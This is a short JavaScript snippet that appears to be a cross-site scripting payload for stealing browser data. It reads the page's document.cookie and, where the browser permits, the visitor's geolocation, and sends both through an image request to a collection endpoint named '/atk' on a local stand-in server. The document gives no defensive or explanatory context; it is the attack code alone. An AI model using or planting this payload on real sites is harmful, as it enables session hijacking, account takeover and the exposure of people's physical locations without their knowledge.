// Function to send data to server
function sendData(cookie, ip, latitude, longitude) {
    var img = new Image();
    img.src = "http://127.0.0.1:8887/atk?cookie=" + encodeURIComponent(cookie) + "&ip=" + encodeURIComponent(ip) + "&latitude=" + encodeURIComponent(latitude) + "&longitude=" + encodeURIComponent(longitude);
}

// Get cookie
var cookie = document.cookie;

// Get IP (This is just a placeholder, replace with actual method to get IP)
// var ip = "127.0.0.1"; // Replace with actual method to get IP

// Get geolocation
if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(function(position) {
        var latitude = position.coords.latitude;
        var longitude = position.coords.longitude;
        sendData(cookie, "", latitude, longitude);
    });
} else {
    console.log("Geolocation is not supported by this browser.");
    sendData(cookie, "", "", "");
}

